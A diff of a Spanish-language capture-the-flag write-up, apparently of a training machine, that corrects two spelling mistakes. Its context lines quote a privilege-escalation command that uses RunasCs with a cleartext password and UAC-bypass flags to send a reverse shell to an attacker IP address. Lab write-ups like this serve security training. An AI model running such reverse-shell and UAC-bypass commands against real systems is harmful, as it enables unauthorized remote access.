@@ -329,7 +329,7 @@ C:\Users\ruben\Desktop>type user.txt
 ```
 
 # Privilege Escalation
-Por alguna razón los proyectos Hugo sin compliar (código base) están en `C:\Temp\www\`
+Por alguna razón los proyectos Hugo sin compilar (código base) están en `C:\Temp\www\`
 
 Aquí nos encontramos dos directorios, `app` e `internal`
 ```console
@@ -779,7 +779,7 @@ napper\backup
 
 Ahora nos podemos mandar una revshell como este usuario.
 
-**El propio `RunasCs.exe` nos está avisando de que usemos la flag --bypass-uac y --logon-type 8 para conseguir un token mas priviliago para el proceso**
+**El propio `RunasCs.exe` nos está avisando de que usemos la flag --bypass-uac y --logon-type 8 para conseguir un token mas privilegiado para el proceso**
 
 ```console
 C:\ProgramData>.\RunasCs.exe backup qGTwMxgZpboSlSJiYGqfSdBXmgtaVRAGWIsPdfVb cmd.exe -r 10.10.14.125:443 --bypass-uac --logon-type 8
